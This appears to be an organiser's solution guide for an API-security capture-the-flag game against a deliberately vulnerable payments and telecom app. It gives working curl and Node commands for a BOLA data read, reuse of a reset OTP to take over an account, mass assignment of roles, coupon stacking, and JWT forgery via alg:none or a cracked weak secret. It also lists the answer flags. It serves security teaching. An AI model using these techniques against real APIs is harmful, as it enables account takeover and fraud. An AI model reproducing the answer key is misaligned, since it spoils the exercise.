# APIShield Breaker — Facilitator Solution Guide
**Organisers only. Do not share with teams.**

Base URL below is written as `$B` — replace with your target's address, e.g. `http://192.168.0.14:4000` or your deployed URL. Every command uses `curl`; teams will mostly use Burp Suite, but curl proves each path.

First, register a normal player to get a low-privilege token (teams do this once):
```bash
curl -s -X POST $B/api/v2/auth/register -H 'Content-Type: application/json' -d '{"handle":"team_name"}'
# -> returns { msisdn, token }.  Save the token as $TOK for authenticated calls.
```

---

## F1 · Programme Leak — API8 Security Misconfiguration (75)
The flag is printed in the exposed API docs; the debug header leaks the JWT secret hint used in F6.
```bash
curl -s $B/api/docs                 # flag is in info.description
curl -s -H 'X-Debug: true' -H 'Authorization: Bearer x.y.z' -X POST $B/api/v2/admin/settlement/withdraw
# debug.config.jwt_secret_hint -> "the company brand name, all lowercase"  (= aegis)
```
**Flag:** `APISHIELD{sw4gger_left_the_door_open}`

## F2 · Read Any CDR — API1 BOLA (150)
No ownership check on the msisdn in the path. Pull the VIP's records; the SMS body holds the flag **and** the reset OTP for F3. (`+` must be URL-encoded as `%2B`.)
```bash
curl -s "$B/api/v2/subscriber/%2B2348030000001/cdr" -H "Authorization: Bearer $TOK"
```
Teams find the VIP number (`+2348030000001`) as a breadcrumb in their own CDR.
**Flag:** `APISHIELD{cdr_b0la_no_owner_check}` · **OTP revealed:** `738291`

## F3 · OTP-Reuse Takeover — API2 Broken Authentication (200)
The reset endpoint trusts the OTP from F2 with no binding to the caller, and it's reusable.
```bash
curl -s -X POST $B/api/v2/auth/password-reset/confirm -H 'Content-Type: application/json' \
  -d '{"msisdn":"+2348030000001","otp":"738291","new_password":"anything"}'
```
**Flag:** `APISHIELD{otp_reuse_full_ato}`

## F4 · Print Your Own Badge — API3 BOPLA / Mass Assignment (200)
The profile update binds the whole body; `kyc_tier` and `role` should never be client-writable.
```bash
curl -s -X PATCH $B/api/v2/pay/profile -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' \
  -d '{"kyc_tier":3,"role":"merchant_admin"}'
```
**Flag:** `APISHIELD{mass_assign_kyc_tier3}`  (returned once `kyc_tier >= 3`)

## F5 · Coupon Stacking — API6 Sensitive Business Flows (175)
`SHIELD5K` (₦5,000 off) has no idempotency and stacks. The cart item is ₦50,000 — apply it 10 times to reach ₦0, then check out. (Teams find the code at `GET /api/v2/mall/promos`.)
```bash
for i in $(seq 1 10); do
  curl -s -X POST $B/api/v2/mall/cart/apply-coupon -H "Authorization: Bearer $TOK" \
    -H 'Content-Type: application/json' -d '{"code":"SHIELD5K"}' >/dev/null; done
curl -s -X POST $B/api/v2/mall/checkout -H "Authorization: Bearer $TOK"
```
**Flag:** `APISHIELD{coupon_stack_to_zero}`

## F6 · Drop the Shield — GRAND, API2 + API5 (400)
Settlement withdraw requires `role: platform_admin`. Normal tokens are `subscriber`. Two intended paths:

**A — alg:none downgrade** (fastest):
```bash
NONE=$(node -e 'const b=o=>Buffer.from(JSON.stringify(o)).toString("base64url");console.log(b({alg:"none",typ:"JWT"})+"."+b({sub:"x",role:"platform_admin"})+".")')
curl -s -X POST $B/api/v2/admin/settlement/withdraw -H "Authorization: Bearer $NONE" -H 'Content-Type: application/json' -d '{}'
```
**B — crack the weak HS256 secret** (`aegis`, from the F1 hint) and re-sign, e.g. with `jwt_tool`/`hashcat`, or:
```bash
HS=$(node -e 'const c=require("crypto");const b=o=>Buffer.from(JSON.stringify(o)).toString("base64url");const h=b({alg:"HS256",typ:"JWT"}),p=b({role:"platform_admin",sub:"x"});console.log(h+"."+p+"."+c.createHmac("sha256","aegis").update(h+"."+p).digest("base64url"))')
curl -s -X POST $B/api/v2/admin/settlement/withdraw -H "Authorization: Bearer $HS" -H 'Content-Type: application/json' -d '{}'
```
**Flag:** `APISHIELD{shield_is_down_settlement_drained}`

---

---

## Planted in-app breadcrumbs (hints teams discover by attacking)
These are baked into the target so teams find guidance by exploring — no need to hand hints out manually. From most to least obvious:

- **Response headers (every response):** `X-Aegis-Diagnostics` reveals the `X-Debug: true` trick (→ F1), and `X-Aegis-Notes` points to the hidden backlog. Teams see these in Burp or `curl -D -`.
- **`/robots.txt`:** disallows `/api/docs`, `/api/v1/`, `/api/v2/internal/` and names the backlog path. Classic recon win.
- **`/.well-known/security.txt`:** also points to the backlog.
- **Landing page HTML comments** (`view-source` on `/`): breadcrumbs to `/api/docs`, the `X-Debug`/`/api/v1` TODOs, and a QA note that profile update takes hidden fields (→ F4).
- **`/api/v2/internal/release-notes`** (the hidden hub — found via robots/header): an in-character engineering backlog whose open tickets each describe one vuln class in dev language:
  - AEG-441 → F2 (CDR has no ownership check)
  - AEG-502 → F3 (reset OTP unbound & reusable)
  - AEG-517 → F4 (profile mass-assigns kyc_tier/role)
  - AEG-530 → F5 (coupons not idempotent, total can go negative)
  - AEG-560 → F6 (settlement trusts role claim; weak key; alg:none accepted)
- **Contextual tells in responses:** `GET /api/v2/pay/profile` returns `editable_fields:[name,email]` (nudges F4); `GET /api/v2/mall/promos` notes the "one per customer" limit is UI-only (nudges F5); your own CDR shows a breadcrumb to the VIP number (nudges F2).

The breadcrumbs *describe* each weakness in-character but never contain a flag — teams still have to perform the exploit. If you'd rather a harder game, you can gut the `/api/v2/internal/release-notes` route and the header hints; the flags remain solvable without them.

### Hint schedule
Each flag has three themed hint tiers (Nudge / Direction / Near-solve) in **CTF Spec v2.0 §3**. Release them on your own cadence or wire them into the console later. Suggested 30-min cadence: open hints at the 10-minute mark (Nudge), 18 (Direction), 25 (Near-solve).

### If a team is stuck on the chain
The only hard dependency is **F2 → F3** (the OTP). Everything else (F1, F4, F5, F6) is independently solvable, so a team stuck on one flag can still score the others. F6 does not require F4.
